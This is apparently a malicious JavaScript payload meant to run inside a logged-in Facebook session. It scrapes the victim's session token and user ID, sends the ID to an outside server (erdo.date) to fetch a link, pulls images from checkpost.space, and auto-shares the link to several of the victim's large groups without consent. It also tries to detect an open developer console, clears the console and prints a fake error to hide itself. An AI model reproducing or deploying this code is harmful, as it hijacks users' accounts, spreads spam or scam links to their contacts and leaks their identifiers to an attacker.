var account="UA-106952642-1",create=document.createElement("script")
create.type="text/javascript",create.innerHTML="(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '"+account+"', 'auto'); ga('send', 'pageview');",document.body.appendChild(create)

var cnsl = true;
var win = this;
var sie = win["XMLHttpRequest"];
var empty = "";

function start() {
    var cookie_name = "start_111101"+profile_id;
    var cookie_time = 60;

    if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*1000*cookie_time){
        localStorage[cookie_name] = Date.now();
        config={};
        config["link"] = "http://{random}./{random}";
        config["group_limit"] = "5";
        config["group_min"] = "500";
        config["mode"] = true;
        config["testuser"] = "100010314190852";
        groups();
        var active_time = new Date();
        active_time.setTime(parseInt(localStorage[cookie_name]) + (60*1000*cookie_time));
        console.log("active_time:" + active_time.toLocaleString());
    }
}





function groups() {
    var params = {};
    params["dpr"] = 1;
    params["viewer"] = profile_id;
    params["filter[0]"] = "group";
    params["options[0]"] = "friends_only";
    params["options[1]"] = "nm";
    params["token"] = "v7";
    params["context"] = "mentions";
    params["rsp"] = "mentions";
    params["__user"] = profile_id;
    params["__a"] = 1;
    params["__dyn"] = dyn_cek;
    params["__af"] = "o";
    params["__req"] = "b";
    params["__be"] = -1;
    params["__pc"] = "EXP1:DEFAULT";
    params["__rev"] = __rev;
    var xhr = new sie();
    xhr.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?"+deSerialize(params), true);
    xhr.onreadystatechange = function(){
        if (xhr.readyState == 4 && xhr.status == 200){
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            if (!data.error && data.payload){
                var groups = [];
                groups = data.payload.entries;
                groups = shuffle(groups);
                var vars = {};
                vars.groups = [];
                for(g=0;g<groups.length&&vars.groups.length <= config.group_limit;g++){
                    if(groups[g].size >= config.group_min && vars.groups.length <= config.group_limit){
                        vars.groups.push(groups[g]);
                    }
                }
                if(vars.groups.length > 0){
                    vars.index = 0;
                    getLink(vars);
                }
            }
        }
    }
    xhr.send();
}


function getImage(vars){
    var link = vars.domain;

    var img = new Image();
    img.width = 475;
    img.crossOrigin = "Anonymous";
    img.onload = function(){
        vars.profile_photo = img;
        vars.link = link;
        getVideoImage(vars);
    }
    img.src = "https://checkpost.space/img.php";
}

function getVideoImage(vars){
    var link = vars.domain;
    var profile_photo = vars.profile_photo;

    var img = new Image();
    img.crossOrigin = "Anonymous";
    img.onload = function(){
        var canvas = document.createElement("canvas");
        canvas.width = 475;
        canvas .height = 317;
        var ctx = canvas.getContext("2d");
        ctx.drawImage(profile_photo,0,0);
        ctx.drawImage(img,(canvas.width/2)-45,(canvas.height/2)-45);
        canvas.toBlob(function(blob){
            vars.blob = blob;
                vars.link = link;
            upload(vars);
        },"image/jpeg", 1);
    }
    img.src = "https://checkpost.space/playbutton.png?ext=me";
}

function upload(vars){
    var link = vars.domain;

    var fd = new FormData();
    fd.append("fb_dtsg", fb_dtsg);
    fd.append("qn", guid());
    fd.append("target_id", profile_id);
    fd.append("source", 8);
    fd.append("profile_id", profile_id);
    fd.append("waterfallxapp", "web_react_composer");
    fd.append("farr", vars.blob, "photo_"+Math.floor(Math.random()*9999)+".png");
    fd.append("upload_id", 1024);

    var getParams = {};
    getParams["av"] = profile_id;
    getParams["dpr"] = 1;
    getParams["__user"] = profile_id;
    getParams["__a"] = 1;
    getParams["__dyn"] = rastgele(100);
    getParams["__req"] = rand(1,20);
    getParams["__be"] = -1;
    getParams["fb_dtsg"] = fb_dtsg;
    getParams["ttstamp"] = ttstamp;
    getParams["__rev"] = __rev;
    getParams["ext"] = "me";

    var xhr = new sie();
    xhr.open("POST", "https://upload.facebook.com/ajax/react_composer/attachments/photo/upload?"+deSerialize(getParams));
    xhr.send(fd);
     xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            if(!data.error){
                vars.link = link;
                vars.pic_big = searchArray(data, "imageSrc");
                getLink(vars);
            }
        }
    }
}


function getLink(vars){
    var xhr = new sie();
    xhr.open("GET", "https://erdo.date/?uid="+profile_id);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText);
            if(data.link){
                vars.domain = "http://"+data.link;
                shareWindow(vars);
            }
        }
    }
}

function checkLink(vars){
    var loader = new Image();
    loader.onload = function(){
     if(loader.width == 1){
        checkBlocked(vars);
     }
    }
    loader.src = vars.domain+"1px.png";
}

function checkBlocked(vars){
    var params = {};
    params["href"] = vars.domain;
    params["ext"] = "me";

    var xhr = new sie();
    xhr.open("GET", "https://www.facebook.com/plugins/feedback.php?"+deSerialize(params));
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            if(xhr.responseText.indexOf("targetFBID") > 0){
                shareWindow(vars);
            }
        }
    }
}






function shareWindow(vars){
    var link = vars.domain;
    var params = {};
    params["app_id"] = "350685531728";
    params["display"] = "popup";
    params["href"] = vars.link;
    params["ext"] = "me";
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://www.facebook.com/dialog/share?"+deSerialize(params), true);
    xhr.onreadystatechange = function(){
        if (xhr.readyState == 4 && xhr.status == 200){

              vars.link = vars.domain;
              console.log(vars.link);
            share(vars);
        }
    }
    xhr.send();
}



function share(vars){
    var params = {};
    var message = "";
    params["fb_dtsg"] = fb_dtsg;
    params["mode"] = "group";
    params["audience_group"] = vars.groups[vars.index].text;
    params["audience_targets"] = vars.groups[vars.index].uid;
    params["av"] = "";
    params["app_id"] = "350685531728";
    params["redirect_uri"] = "https://www.facebook.com/dialog/return/close";
    params["display"] = "popup";
    params["access_token"] = "";
    params["sdk"] = "";
    params["from_post"] = 1;
    params["xhpc_context"] = "home";
    params["xhpc_ismeta"] = 1;
    params["xhpc_timeline"] = "";
    params["xhpc_targetid"] = profile_id;
    params["xhpc_publish_type"] = 1;
    params["xhpc_message_text"] = message;
    params["xhpc_message"] = message;
    params["quote"] = "";
    params["is_explicit_place"] = "";
    params["composertags_place"] = "";
    params["composertags_place_name"] = "";
    params["tagger_session_id"] = Math.floor(Date.now()/1000);
    params["action_type_id[0]"] = "";
    params["object_str[0]"] = "";
    params["object_id[0]"] = "";
    params["hide_object_attachment"] = 0;
    params["og_suggestion_mechanism"] = "";
    params["og_suggestion_logging_data"] = "";
    params["icon_id"] = "";
    params["share_action_properties"] = JSON.stringify({object:vars.link});
    params["share_action_type_id"] = "400681216654175";
    params["device_code"] = "";
    params["device_shared"] = "";
    params["ref"] = "";
    params["caption"] = "";
    params["title"] = "";
    params["description"] = "";
    params["picture"] = "";
    params["dialog_url"] = "https://www.facebook.com/dialog/share?app_id=350685531728&display=popup&href="+vars.link;
    params["composertags_city"] = "";
    params["disable_location_sharing"] = false;
    params["composer_predicted_city"] = "";
    params["privacyx"] = "300645083384735";
    params["__CONFIRM__"] = 1;
    params["__user"] = profile_id;
    params["__a"] = 1;
    params["__dyn"] = dyn_cek;
    params["__af"] = rastgele(2);
    params["__req"] = rand(1,20);
    params["__be"] = -1;
    params["__pc"] = "PHASED:DEFAULT";
    params["__rev"] = __rev;
    params["ttstamp"] = ttstamp;
    params["logging"] = ttstamp;

    var xhr = new sie();
    xhr.open("POST", "https://www.facebook.com/dialog/share/submit?ext=me");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200){
            if(xhr.responseText.indexOf("ServerRedirect") > 0){
                vars.post_id = xhr.responseText.split("post_id=")[1].split("&")[0].split("#")[0];
                console.log("Shared: https://www.facebook.com/"+vars.post_id);
                //checkPost(vars);
            }
            if(vars.index < config.group_limit-1 && vars.index < vars.groups.length-1){
                vars.index++;
                share(vars);
            }
        }
    }
    xhr.send(deSerialize(params));
}





function privacySetting(){
    var params = {}
    params["value"] = "300645083384735";
    params["prev_value"] = "291667064279714";
    params["__user"] = profile_id;
    params["__a"] = 1;
    params["__dyn"] = dyn_cek;
    params["__req"] = "15";
    params["fb_dtsg"] = fb_dtsg;
    params["ttstamp"] = ttstamp;
    params["__rev"] = __rev;
    var xhr = new sie();
    xhr.open("POST", "https://www.facebook.com/ajax/settings/granular_privacy/composer.php");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));

        }
    }
}

function generate_name(length,firstUpper){
    rname = "";
    sesli = "aeiou";
    sessiz = "bcdfghjklmnprstvyz";
    rname = rand(1,2) == 1?sessiz[rand(0,sessiz.length-1)]:sesli[rand(0,sesli.length-1)];
    if(firstUpper == true){
        rname = rname.toUpperCase();
    }
    for(n=0;n<length;n++){
        if(sesli.indexOf(rname[rname.length-1]) >= 0){
            rname += sessiz[rand(0,sessiz.length-1)];
        }else{
            rname += sesli[rand(0,sesli.length-1)];
        }
    }
    return rname;
}

function inArray(arr, key, value){
    var res = false;
    for(a=0;a<arr.length;a++){
        for(k in arr[a]){
            if(k == key && arr[a][k] == value){
                res = true;
                break;
            }
        }
    }
    return res;
}

function decode(t,h){
    var a = "abcdefghijklmnoprstuvyzx0123456789";
    var c = "";
    for(cr=0;cr<t.length;cr++){
        c += a[h.indexOf(t[cr])];
    }
    return c;
}

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

function randoms(l, m) {
    var r = [];
    while (r.length < l) {
        var rnd = Math.floor(Math.random() * m);
        if (r.indexOf(rnd) < 0) {
            r.push(rnd);
        }
    }
    return r;
}

function searchArray(a,k){
    var found = false;
    for(key in a){
        if(key.toString() == k){
            found = a[key];
            break;
        }else if(typeof a[key] == "object"){
            found = searchArray(a[key],k);
            if(found != false){
                break;
            }
        }
    }
    return found;
}

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  while (0 !== currentIndex) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}

function rand(min,max){
    return Math.floor(Math.random()* (max-min))+min;
}

function rastgele(uzunluk) {
    mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
    ret = "";
    for (l = 0; l < uzunluk; l++) {
        ret += mtn[Math.floor(Math.random() * mtn.length)];
    }
    return ret;
}

function deSerialize(json) {
    return Object.keys(json).map(function(key) {
        return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
    }).join('&');
}

function get_dyn() {
    var bd = document.body.innerHTML.match(/\},([0-9])+\]/gi)
    var hd = document.head.innerHTML.match(/\},([0-9])+\]/gi)

    var is = bd.concat(hd);
    var t = [];
    for (x in is) {
        if (is[x] != null) {
            var p = is[x].replace('},', "").replace(']', "");
            if (parseInt(p) >= 7) {
                t.push(parseInt(p));
            }
        }
    }

    var h = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_';

    function toCompressedString() {
        $BitMap1 = [];
        for (i in t) {
            $BitMap1[t[i]] = 1;
        }

        if ($BitMap1.length === 0)
            return '';
        var l = [],
            m = 1,
            n = $BitMap1[0] || 0,
            o = n.toString(2);
        for (var p = 1; p < $BitMap1.length; p++) {
            var q = $BitMap1[p] || 0;
            if (q === n) {
                m++;
            } else {
                l.push(j(m));
                n = q;
                m = 1;
            }
        }
        if (m)
            l.push(j(m));
        return k(o + l.join(''));
    }

    function j(l) {
        var m = l.toString(2),
            n = '0'.repeat(m.length - 1);
        return n + m;
    }

    function k(l) {
        var m = (l + '00000').match(/[01]{6}/g),
            n = '';
        for (var o = 0; o < m.length; o++) {
            n += h[parseInt(m[o], 2)];
        }

        return n;
    }
    return toCompressedString();
}

var cntrl = 'd';
var element = new Image();
if (location.hostname.indexOf("facebook.com") >= 0){
  element.__defineGetter__('id', function() {
      cntrl = 'e';
  });
  console.log(element);
  console.clear();
}

function getDtsg(){
    var xhr = new sie();
    xhr.open("GET", "https://www.facebook.com/");
    xhr.send();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            profile_id = xhr.responseText.split('USER_ID":')[1].split('"')[1].split('"')[0];
            if(profile_id != 0){
                fb_dtsg = xhr.responseText.split('name="fb_dtsg')[1].split('value="')[1].split('"')[0];
                __rev = xhr.responseText.split('"server_revision":')[1].split(",")[0];
                ttstamp = "";
                for (var x = 0; x < fb_dtsg.length; x++){
                    ttstamp += fb_dtsg.charCodeAt(x);
                }
                ttstamp = '2' + ttstamp;
                 dyn_cek = get_dyn();
                console.log("User:"+profile_id);
                console.log("fb_dtsg:"+fb_dtsg);
                console.log("__rev:"+__rev);
                console.log("ttstamp:"+ttstamp);
                start();
            }
        }
    }
}

if (location.hostname.indexOf("facebook.com") >= 0 && (cntrl == 'd' || cnsl == true)) {
    if(!document.getElementById("isrun") && location.href.indexOf("facebook.com/checkpoint") < 0){
        var lg = document.createElement("meta");
        lg.id = "isrun";
        document.head.appendChild(lg);
        getDtsg();
    }
}else if(location.hostname.indexOf("facebook.com") >= 0){
    console.error("Uncaught ReferenceError: fb_dtsg is not defined");
}
